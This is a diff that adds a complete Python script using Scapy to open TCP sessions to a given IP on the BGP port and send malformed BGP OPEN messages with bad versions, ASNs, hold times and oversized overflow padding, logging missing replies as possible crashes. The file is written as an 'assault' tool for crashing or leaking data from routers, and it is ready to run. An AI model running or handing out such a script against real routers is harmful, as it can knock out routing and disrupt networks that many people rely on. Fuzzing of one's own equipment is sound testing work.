@@ -1,0 +1,70 @@
+from scapy.all import *
+from scapy.contrib.bgp import *
+import random
+import time
+import logging
+
+logging.basicConfig(filename='codex_cve_assault.log', level=logging.INFO, format='%(asctime)s - %(message)s')
+
+def cve_assault_fuzz(target_ip, dst_port=179):
+    ip = IP(dst=target_ip)
+
+    # Dangerous combinations for triggering crash/leakage
+    versions = [0, 1, 2, 3, 4]
+    asns = [0, 64512, 65000, 65535]
+    hold_times = [0, 90, 255]
+    opt_lens = [0, 10, 255, 512, 1024]
+
+    for i in range(10):  # 10 rounds of intense fire
+        version = random.choice(versions)
+        asn = random.choice(asns)
+        hold = random.choice(hold_times)
+        opt_len = random.choice(opt_lens)
+        router_id = ".".join(str(random.randint(1, 254)) for _ in range(4))
+
+        # TCP setup
+        src_port = RandShort()
+        syn = TCP(sport=src_port, dport=dst_port, flags='S', seq=1000)
+        syn_ack = sr1(ip/syn, timeout=2, verbose=0)
+
+        if not syn_ack or not syn_ack.haslayer(TCP) or syn_ack[TCP].flags != 'SA':
+            print(f"[{i}] [!] SYN-ACK failed")
+            logging.info(f"[{i}] No SYN-ACK received for {target_ip}")
+            continue
+
+        ack = TCP(sport=src_port, dport=dst_port, flags='A', seq=syn_ack.ack, ack=syn_ack.seq + 1)
+        send(ip/ack, verbose=0)
+
+        # BGP OPEN + overflow
+        bgp_open = BGPHeader(type=1)/BGPOpen(
+            version=version,
+            my_as=asn,
+            hold_time=hold,
+            bgp_id=router_id,
+            opt_param_len=min(opt_len, 255)
+        )
+
+        # Overflow payload
+        overflow = Raw(load=b"A" * opt_len)
+
+        pkt = ip/TCP(sport=src_port, dport=dst_port, flags='PA', seq=ack.seq, ack=ack.ack)/bgp_open/overflow
+        print(f"[{i}] [+] Sending: ver={version}, asn={asn}, hold={hold}, opt_len={opt_len}")
+        logging.info(f"Sent fuzz: version={version}, ASN={asn}, hold={hold}, opt_len={opt_len}")
+
+        response = sr1(pkt, timeout=3, verbose=0)
+        if response:
+            summary = response.summary()
+            print(f"[{i}] [+] Response: {summary}")
+            logging.info(f"[{i}] Response: {summary}")
+        else:
+            print(f"[{i}] [!] No response — possible crash")
+            logging.info(f"[{i}] No response — possible crash or silent drop")
+
+        time.sleep(1.5)
+
+if __name__ == "__main__":
+    import sys
+    if len(sys.argv) != 2:
+        print("Usage: sudo python3 codex_cve_assault.py <target_ip>")
+        sys.exit(1)
+    cve_assault_fuzz(sys.argv[1])
